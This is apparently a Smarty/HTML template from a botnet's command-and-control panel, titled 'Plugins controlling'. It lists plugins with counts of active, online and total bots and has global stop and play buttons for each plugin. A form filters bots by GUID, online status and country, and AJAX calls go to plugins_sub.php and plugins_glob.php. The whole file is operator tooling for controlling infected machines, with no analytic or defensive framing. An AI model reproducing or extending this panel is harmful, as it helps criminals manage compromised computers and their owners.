<h2><b>Plugins controlling</b></h2>


<form id="frm__plugins">

<table width="300px" cellspacing="0" cellpadding="3" border="1" style="border: 1px solid lightgray; font-size: 9px; border-collapse: collapse; background-color: rgb(255, 255, 255);">

<th style='background: rgb(80,80,80); color: rgb(232,232,232);'>Plugin for use</th>
<th style='background: rgb(80,80,80); color: rgb(232,232,232);'>Count</th>
<th style='background: rgb(80,80,80); color: rgb(232,232,232);'>[Global actions]</th>

{foreach from=$CONT_ARR item=REC}
<tr align='center'>
<td align='left'> <table cellspacing='0' cellpadding='0'><tr><td><input type="radio" {$REC.PCHECKED} name="plugin" value="{$REC.PLUGIN}"></td><td> {$REC.PLUGIN}</td></tr></table> </td>
<td id='t{$REC.I}' title='Active bots / Online bots / All bots ... with such plugin'><font style='color: rgb(65, 183, 81); font-size: 11px;'><b>{$REC.CNTACTONLINE}</b></font> <i>/</i> <b>{$REC.CNTONLINE}</b> <i>/</i> {$REC.CNT}</td>			
<td><a id='bGlobalStop' href="#" onclick="showGlobalItemStat(0, {$REC.I}, '{$REC.PLUGIN}'); return false;"><img border='0' src='img/icos/stop.png'></a>
<a id='bGlobalPlay' href="#" onclick="showGlobalItemStat(1, {$REC.I}, '{$REC.PLUGIN}'); return false;"><img border='0' src='img/icos/play.png'></a></td>	
</tr>
{/foreach}


</table>

<hr size="1" color="#cccccc">

<table width="100%" cellspacing="0" cellpadding="3" border="1" style="border: 1px solid lightgray; font-size: 9px; border-collapse: collapse; background-color: rgb(255, 255, 255);">
<tr>
	<td width="150px" align="left"><b>Bot GUID :</b></td>
	<td align="left">
		<div>
		<span style="margin-left: 0px;"><input type="text" value="" name="bot_guid" id="bot_guid" style="width: 400px;"></span>
		</div>
	</td>
</tr>
<tr>
	<td width="150px" align="left"><b>Limit :</b></td>
	<td align="left"><input type="text" value="100" name="limit" id="limit" style="width: 50px;"></td>
</tr>
<tr>
	<td width="150px" align="left"><b>Options :</b></td>
	<td align="left">
		<table cellspacing="0" cellpadding="0"><tr>
			<td><input type="checkbox" checked name="onlyonline" id="onlyonline" style="width: 50px;"></td>
			<td> Only online</td>
		</table>
	</td>
</tr>

{literal}
<script>function showCountries()
{
	var myDiv = document.getElementById('countries');
	var myExtDiv = document.getElementById('ext_countries');
	if(myDiv.style.display == 'none')
	{
		myDiv.style.display = 'block';
		myExtDiv.style.display = 'none';
	} else 
	{
		myDiv.style.display = 'none';
		myExtDiv.style.display = 'block';
	}
	return false;
}</script>
{/literal}

<tr align='left'>
	<td colspan="2">
		<FIELDSET><LEGEND align="center"><a href='javascript:void();' onclick='showCountries();'><b>Countries</b></a>:</LEGEND>
		<div id='ext_countries'><center><a href='javascript:void();' onclick='showCountries();'><i>click here to view countries list</i></a></center></div>
		<div id='countries' style='display:none;'>
		&nbsp;<a href="javascript:void(0)" onClick="CheckAll('fk_country', true);">Select All</a> &nbsp;&nbsp;
		<a href="javascript:void(0)" onClick="CheckAll('fk_country', false);">Unselect All</a>
		<table align='center'>
		<tr valign="top">

{foreach from=$CONT_ARR2 item=ELEM}
			<td>
				<table border='1' cellspacing='0' cellpadding='1' style='border: 1px solid gray; font-size: 9px; border-collapse: collapse; background-color: white;'>

	{foreach from=$ELEM item=REC}
				<tr>
					<td width='20px' align="center"><input type="checkbox" id="idCntr{$REC.MRES_IC}" name="fk_country[{$REC.MRES_IC}]"></td>
					<td width='30px' align="center"><label for="idCntr{$REC.MRES_IC}"><img border='0' src='img/flags/{$REC.CCODE}.gif'></label></td>
					<td width='100px'>&nbsp; <label for="idCntr{$REC.MRES_IC}">{$REC.MRES_NAME}</label></td>
				</tr>


	{/foreach}
				</table></td>
{/foreach}

</tr>
		</table>
		</div>
		</FIELDSET></td>
</tr>


<tr>
	<td width="150px" align="center" colspan="2"><input type="button" onclick="get_plugins(); return false;" value="submit" id='bPluginsSubmit'></td>
</tr>
</table>

</form>

<hr size="1" color="#cccccc">

<div align="center" id="sub_div_ajax">
</div>


{literal}
<script language="JavaScript" type="text/javascript">

function get_plugins() 
{
	var pdata = $('#frm__plugins').serialize(true);
    $.post('./mod/plugins_sub.php', pdata, function(data) { $("#sub_div_ajax").html(data); });
}

function showGlobalItemStat(arg, i, plugin) 
{
	load('./mod/plugins_glob.php?plugin=' + plugin + '&act=' + arg, 't' + i);
}

function CheckAll(name, checked) 
{
	f = document.getElementById('frm__plugins');
	for (var i = 0; i < f.elements.length; i++) {
		if(f.elements[i].type == 'checkbox' && f.elements[i].name.substr(0, name.length) == name){
			f.elements[i].checked = checked;
		}
	}
}

</script>
{/literal}